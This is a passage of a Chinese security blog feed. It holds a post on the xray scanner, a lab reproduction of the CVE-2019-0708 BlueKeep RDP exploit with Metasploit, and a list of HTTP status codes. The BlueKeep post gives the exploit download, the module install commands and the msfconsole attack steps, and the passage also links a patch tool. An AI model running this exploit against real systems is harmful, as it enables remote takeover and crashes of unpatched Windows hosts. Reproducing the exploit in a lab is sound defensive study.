class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143531.png" class="lozad"></p><h2 id="3-3-测试"><a href="#3-3-测试" class="headerlink" title="3.3 测试"></a>3.3 测试</h2><p>安装好证书后，重启浏览器，再次访问百度，可以看到没有证书不安全的标志了，说明证书安装成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143558.png" class="lozad"></p><p>碰巧还看到了检测出一个漏洞</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143609.png" class="lozad"></p><h1 id="0x04-使用技巧"><a href="#0x04-使用技巧" class="headerlink" title="0x04 使用技巧"></a>0x04 使用技巧</h1><h2 id="4-1-常用命令"><a href="#4-1-常用命令" class="headerlink" title="4.1 常用命令"></a>4.1 常用命令</h2><p>虽然在刚刚前面的快速使用中命令有很多种，但是常用的命令就那几个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p>浏览器设置本地代理，以360浏览器为例</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920150553.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920150614.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920150644.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920150734.png" class="lozad"></p><p>然后通过浏览器手动点击一些页面，xray会自动对这些页面进行测试，非常好用</p><h2 id="4-2-结合burpsuite使用"><a href="#4-2-结合burpsuite使用" class="headerlink" title="4.2 结合burpsuite使用"></a>4.2 结合burpsuite使用</h2><p>burpsuite是个神器是大家公认的，对有很多网站不能使用像AWVS和APPscan这样的大型扫描器来进行测试的，所以只能使用burpsuite来进行手动测试了。在这里如果将burpsuite和xray结合在一起的话，那找漏洞是非常nice的。</p><p><img alt="img" data-src="https://chaitin.github.io/xray/assets/xray-burp-proxy-chain.png" class="lozad"></p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p>1、<a href="https://www.anquanke.com/post/id/184204" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184204</a></p><p>2、<a href="https://www.jishuwen.com/d/2TvQ" target="_blank" rel="noopener">https://www.jishuwen.com/d/2TvQ</a></p><p>3、 <a href="https://chaitin.github.io/xray" target="_blank" rel="noopener">https://chaitin.github.io/xray</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在漏洞挖掘中除了手动挖掘，一般都是用一些扫描器开辅助我们去进行测试，比如AWVS,APPSCAN，n
      
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="xray" scheme="https://www.mad-coding.cn/tags/xray/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708复现教程</title>
    <link href="https://www.mad-coding.cn/2019/09/11/CVE-2019-0708%E5%A4%8D%E7%8E%B0%E6%95%99%E7%A8%8B/"/>
    <id>https://www.mad-coding.cn/2019/09/11/CVE-2019-0708复现教程/</id>
    <published>2019-09-11T09:23:28.000Z</published>
    <updated>2019-09-11T10:29:44.651Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几天，随着CVE-2019-0708漏洞EXP的现世，顿时让安全圈躁动起来，大家都通过官网的一些文档教程来自己搭建环境复现漏洞，而菜鸡的我，复现了好久，却久久不能复现成功，今天再次复现，发现了问题的所在，再次献上自己的复现教程，虽然网上教程已经泛滥。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911173741.png" class="lozad"></p><a id="more"></a><h1 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h1><blockquote><p>攻击机：kali Linux 2019.2</p><p>靶机：Windows7 ultimate SP1 </p><p>Windows server 2008 R2标准版</p><p>攻击框架：metasploit</p><p>EXP：cve_2019_0708_bluekeep_rce</p></blockquote><h1 id="0x02-相关文件下载"><a href="#0x02-相关文件下载" class="headerlink" title="0x02 相关文件下载"></a>0x02 相关文件下载</h1><p>CVE-2019-0708 exp下载地址：<a href="https://github.com/mai-lang-chai/CVE-2019-0708-RCE/blob/master/CVE-2019-0708RDPMSF%E6%94%BB%E5%87%BB%E5%A5%97%E4%BB%B6.zip" target="_blank" rel="noopener">传送门</a></p><p>Windows7 ultimate SP1下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</span><br></pre></td></tr></table></figure><p>Windows server 2008 R2标准版下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed2k://|file|cn_windows_server_2008_r2_hpc_edition_with_service_pack_1_x64_dvd_700632.iso|3071051776|7FDEE0F7A49FC63148D4DE580D803742|/</span><br></pre></td></tr></table></figure><h1 id="0x03-开搞"><a href="#0x03-开搞" class="headerlink" title="0x03 开搞"></a>0x03 开搞</h1><h2 id="3-1-跟新metasploit框架"><a href="#3-1-跟新metasploit框架" class="headerlink" title="3.1 跟新metasploit框架"></a>3.1 跟新metasploit框架</h2><p>首先需要跟新到最新的metasploit框架，版本是5.0.47版本</p><p>跟新命令脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure><p>跟新完成的版本截图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174035.png" class="lozad"></p><p>跟新后可能会出现如下两个问题</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174058.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174146.png" class="lozad"></p><p>意思是没有启动带数据库支持的MSF服务需要我们去启动，其实这对于复现漏洞没有影响，就是看着难受</p><p>【解决方法】</p><p>我们使用<code>exit</code>退出<code>msfconsole</code>,然后输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure><p>输入完成后等待显示：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174310.png" class="lozad"></p><p>这个字样在输入：msfdb init</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174325.png" class="lozad"></p><p>再次输入msfconsole，问题解决</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174344.png" class="lozad"></p><h2 id="3-2-替换exp文件"><a href="#3-2-替换exp文件" class="headerlink" title="3.2 替换exp文件"></a>3.2 替换exp文件</h2><p>首先需要下载0708的exp文件，这个文件在前面以及分享过了，也可以利用wget命令直接下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure><p> 然后，进入刚刚下载的exp的目录，然后使用下面命令替换原来的exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">cp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line"></span><br><span class="line">mkdir /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp  <span class="comment">##创建rdp目录</span></span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><h2 id="3-3-开始复现"><a href="#3-3-开始复现" class="headerlink" title="3.3 开始复现"></a>3.3 开始复现</h2><h3 id="3-3-1-Windows-7-x64-sp1配置"><a href="#3-3-1-Windows-7-x64-sp1配置" class="headerlink" title="3.3.1 Windows 7 x64 sp1配置"></a>3.3.1 Windows 7 x64 sp1配置</h3><p>第一步：关闭防火墙</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175227.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175304.png" class="lozad"></p><p><img alt="1568195617145" data-src="C:%5CUsers%5C10367%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1568195617145.png" class="lozad"></p><p>第二步：开启3389远程</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175410.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175444.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175542.png" class="lozad"></p><h3 id="3-3-2使用的命令"><a href="#3-3-2使用的命令" class="headerlink" title="3.3.2使用的命令"></a>3.3.2使用的命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole <span class="comment">##进入metasploit框架</span></span><br><span class="line">reload_all <span class="comment">##重新载入漏洞模块</span></span><br><span class="line">search 0708 <span class="comment">##搜索0708的漏洞</span></span><br><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep _rce  <span class="comment">##0708RDP攻击模块</span></span><br><span class="line">info  <span class="comment">##查看漏洞的相关信息</span></span><br><span class="line">show options <span class="comment">##查看需要设置的参数</span></span><br><span class="line"><span class="built_in">set</span> rhosts <span class="comment">##靶机ip ##设置需要攻击的靶机ip地址</span></span><br><span class="line">show targets  <span class="comment">##显示可以攻击的靶机类型</span></span><br><span class="line"><span class="built_in">set</span> target 数字 <span class="comment">##设置攻击的靶机类型</span></span><br><span class="line">exploit <span class="comment">##开始利用</span></span><br></pre></td></tr></table></figure><blockquote><p>msfconsole</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180426.png" class="lozad"></p><blockquote><p>reload_all</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180514.png" class="lozad"></p><blockquote><p>search 0708</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180532.png" class="lozad"></p><blockquote><p>info</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Name: CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free</span><br><span class="line">Module: exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">Platform: Windows</span><br><span class="line">Arch: </span><br><span class="line">       Privileged: Yes</span><br><span class="line">License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Manual</span><br><span class="line">  Disclosed: 2019-05-14</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Sean Dillon &lt;sean.dillon@risksense.com&gt;</span><br><span class="line">  Ryan Hanson &lt;dunno@findthisout.com&gt;</span><br><span class="line">  OJ Reeves &lt;oj@beyondbinary.io&gt;</span><br><span class="line">  Brent Cook &lt;bcook@rapid7.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic targeting via fingerprinting</span><br><span class="line">  1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)</span><br><span class="line">  2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox)</span><br><span class="line">  3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)</span><br><span class="line">  4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name             Current Setting  Required  Description</span><br><span class="line">  ----             ---------------  --------  -----------</span><br><span class="line">  RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">  RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random</span><br><span class="line">  RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">  RDP_USER                          no        The username to report during connect, UNSET = random</span><br><span class="line">  RHOSTS                            yes       The target address range or CIDR identifier</span><br><span class="line">  RPORT            3389             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 952</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  The RDP termdd.sys driver improperly handles binds to internal-only </span><br><span class="line">  channel MS_T120, allowing a malformed Disconnect Provider Indication </span><br><span class="line">  message to cause use-after-free. With a controllable data/size </span><br><span class="line">  remote nonpaged pool spray, an indirect call gadget of the freed </span><br><span class="line">  channel is used to achieve arbitrary code execution.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2019-0708/</span><br><span class="line">  https://github.com/zerosum0x0/CVE-2019-0708</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  Bluekeep</span><br></pre></td></tr></table></figure><blockquote><p>show options</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180651.png" class="lozad"></p><blockquote><p>set rhosts 靶机IP地址</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180915.png" class="lozad"></p><blockquote><p>show targets</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180936.png" class="lozad"></p><blockquote><p>set target 3</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911181004.png" class="lozad"></p><blockquote><p>exploit</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911181144.png" class="lozad"></p><p>ps: run和exploit都行</p><h1 id="0x04-复现结果"><a href="#0x04-复现结果" class="headerlink" title="0x04 复现结果"></a>0x04 复现结果</h1><p>Windows server 2008 R2标准版出现蓝屏</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175744.png" class="lozad"></p><p>Windows 7 ultimate sp1复现结果</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175754.png" class="lozad"></p><h1 id="0X05-漏洞检测修复工具-amp-批量快速扫描检测工具-amp-热补丁工具"><a href="#0X05-漏洞检测修复工具-amp-批量快速扫描检测工具-amp-热补丁工具" class="headerlink" title="0X05 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具"></a>0X05 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具</h1><blockquote><p>（来源奇安信公众号）</p></blockquote><p>【下载页面】<br><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank" rel="noopener">https://www.qianxin.com/other/CVE-2019-0708</a><br>【使用说明】</p><p>1、 下载文件进行解压。<br>2、 使用win+R快捷键或开始菜单选择“运行”，输入cmd。调起命令行工具。<br>3、 在命令行工具，执行命令到工具所在文件夹<br>4、 输入命令对应功能，启用热补丁命令：QKShield.exe /enable ；禁用热补丁命令：QKShield.exe/disable 。<br>5、 重启系统后，需要重新运行命令行来启用热补丁</p><p>【实现效果】<br>在工具支持的系统中启用热补丁后，用漏洞扫描工具扫描结果为没有漏洞。漏洞扫描工具下载地址：<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank" rel="noopener">传送门</a><br>支持系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Windows XP <span class="keyword">for</span> 32-bit Systems Service Pack 3</span><br><span class="line">Windows 7 <span class="keyword">for</span> 32-bit Systems</span><br><span class="line">Windows 7 <span class="keyword">for</span> x64-based Systems</span><br><span class="line">Windows 7 <span class="keyword">for</span> 32-bit Systems Service Pack 1</span><br><span class="line">Windows 7 <span class="keyword">for</span> x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2003 <span class="keyword">for</span> 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2003 R2 <span class="keyword">for</span> 32-bit Systems Service Pack2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> x64-based Systems Service Pack2 (Server Core installation)</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> x64-based Systems ServicePack 1</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> x64-based Systems ServicePack 1 (Server Core installation)</span><br><span class="line">暂不支持的系统：</span><br><span class="line">Windows Server 2003 <span class="keyword">for</span> x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> Itanium-Based Systems ServicePack 2</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> Itanium-Based SystemsService Pack 1</span><br></pre></td></tr></table></figure><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>从漏洞刚出来开始，我就开始复现，然后各种安装环境，操作系统，但是都没有复现成功，然后看各种文章，感觉都是那些基本操作，么有什么其他地方，然后我使用Windows 7 X64 ultimate sp1 和Windows server 2008 R2都没有复现成功，弄了两天我放弃了，今天我的一天同事也复现这个漏洞，点出了我的错误所在，原来，我讲set target 3 写成了set targets 3 ，我真是太粗心了，没有注意细节，以为show targets命令是列出可攻击的目标列表，就像当然的认为设置目标是set targets了。。。,然后一直复现不成功</p><p><img alt="img" data-src="https://i02piccdn.sogoucdn.com/d535d591ed8c8755" class="lozad"></p><p>最后，自己要记住这个教训，细节注定成败，而我这次败在了细节上，希望自己以后不会忽略这些小细节。共勉 :D</p><h1 id="0x06-参考文档"><a href="#0x06-参考文档" class="headerlink" title="0x06 参考文档"></a>0x06 参考文档</h1><ol><li><a href="https://blog.csdn.net/weixin_44114370/article/details/89440153" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44114370/article/details/89440153</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzAxNjQ1NDQ0Mw==&amp;mid=2247483662&amp;idx=1&amp;sn=9927dd8b4df7e710ddc4d8b02f922d8d&amp;chksm=9bf5c74aac824e5cfbde1c6587b6fdb149d464bc822a5b764f25538183e6e64934d549461d5d&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1567824187733&amp;sharer_shareid=6236dccf93a9257bd8ba451703af334b&amp;key=ee95eb58550bee7fb822e11f9b1822af1833bae210322a6de084b4219a556826d764fbbf32aa5607dc4acf61a722ef8421901382f992c938d121d6226db2bc2b35a9d19b0eec3693f4a44e6b5d0298de&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=5vOsZrZPCHS2PeMt2y%2FquS927zFQZnSX%2FB%2FcGniqOlND7FA0KtfW5jlUG4BlXuNP" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxNjQ1NDQ0Mw==&amp;mid=2247483662&amp;idx=1&amp;sn=9927dd8b4df7e710ddc4d8b02f922d8d&amp;chksm=9bf5c74aac824e5cfbde1c6587b6fdb149d464bc822a5b764f25538183e6e64934d549461d5d&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1567824187733&amp;sharer_shareid=6236dccf93a9257bd8ba451703af334b&amp;key=ee95eb58550bee7fb822e11f9b1822af1833bae210322a6de084b4219a556826d764fbbf32aa5607dc4acf61a722ef8421901382f992c938d121d6226db2bc2b35a9d19b0eec3693f4a44e6b5d0298de&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=5vOsZrZPCHS2PeMt2y%2FquS927zFQZnSX%2FB%2FcGniqOlND7FA0KtfW5jlUG4BlXuNP</a></li><li><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961" target="_blank" rel="noopener">https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961</a> </li><li><a href="https://github.com/mai-lang-chai/CVE-2019-0708-RCE" target="_blank" rel="noopener">https://github.com/mai-lang-chai/CVE-2019-0708-RCE</a></li><li><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank" rel="noopener">https://www.qianxin.com/other/CVE-2019-0708</a></li></ol><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前几天，随着CVE-2019-0708漏洞EXP的现世，顿时让安全圈躁动起来，大家都通过官网的一些文档教程来自己搭建环境复现漏洞，而菜鸡的我，复现了好久，却久久不能复现成功，今天再次复现，发现了问题的所在，再次献上自己的复现教程，虽然网上教程已经泛滥。&lt;/p&gt;
&lt;p&gt;&lt;img alt data-src=&quot;https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911173741.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞复现" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE" scheme="https://www.mad-coding.cn/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>常见的HTTP响应状态码</title>
    <link href="https://www.mad-coding.cn/2019/09/10/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E5%93%8D%E5%BA%94%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    <id>https://www.mad-coding.cn/2019/09/10/常见的HTTP响应状态码/</id>
    <published>2019-09-10T08:13:54.000Z</published>
    <updated>2019-09-10T08:30:40.111Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h1><p>100 –继续–请求者应当继续提出请求。服务器已收到请求的一部分，正在等待其余部分</p><p>101 –切换协议–请求者已要求服务器切换协议，服务器已确认并准备切换</p><p>200 –成功–服务器已成功处理了请求</p><p>201 –已创建–请求成功并且服务器创建了新的资源</p><p>202 –已接受–服务器已接受请求，但尚未处理</p><p>203 –非授权信息–服务器已成功处理了请求，但返回的想你想可能来自另一个源</p><p>204  –无内容–服务器成功处理了请求，但没有返回任何内容</p><p>205 –重置内容–服务器成功处理了请求，内容被重置</p><p>206 –部分内容–服务器成功处理部分请求</p><p>300 –多种选择–针对请求，服务器可执行多种操作</p><p>301 –永久移动 –请求的网页已永久移动到新的位置，即永久重定向</p><p>302 –临时移动–请求的网页暂时跳转到其他按页面，即暂时重定向</p><p>303 –查看其他位置–如果原来的请求是POST，重定向目标文档应该通过GET提取</p><p>304 –未修改–此次请求返回的网页未修改，继续使用上次的资源</p><p>305 –使用代理–请求者应该使用代理访问该网页</p><p>307 –临时重定向–请求的资源临时从其他位置响应</p><p>400 –错误请求–服务器无法解析该请求</p><p>401 –未授权–请求没有进行身份验证或者验证未通过</p><p>403 –禁止访问–服务器拒绝此请求</p><p>404 –未找到–服务器找不到请求的网页</p><p>405 –方法禁用–服务器禁用了请求中指定的方法</p><p>406 –不接受 –无法使用请求的内容响应请求的网页。</p><p>407 –需要代理授权–请求者需要使用代理授权</p><p>408 –请求超时–服务器请求超时</p><p>409 –冲突–服务器在完成请求时发生冲突</p><p>410 –已删除–请求的资源已永久删除</p><p>411 –需要有效长度–服务器不接受不含有有效内容长度表头字段的请求。</p><p>501 –未实现–服务器不具备完成请求的功能<br>502 –错误网关–服务器作为网关或者代理，从上游服务器收到无效响应<br>503 –服务不可用–服务器目前无法使用<br>504 –网关超时–服务器作为网关或者代理，但是没有及时从上游服务器收到请求<br>505 –HTTP版本不支持–服务器不支持请求中所用的HTTP协议版本</p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基础Vim命令</title>
    <link href="https://www.mad-coding.cn/2019/09/05/%E5%9F%BA%E7%A1%80Vim%E5%91%BD%E4%BB%A4/"/>
    <id>https://www.mad-coding.cn/2019/09/05/基础Vim命令/</id>
    <published>2019-09-05T03:16:16.000Z</published>
    <updated>2019-09-05T03:16:16.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
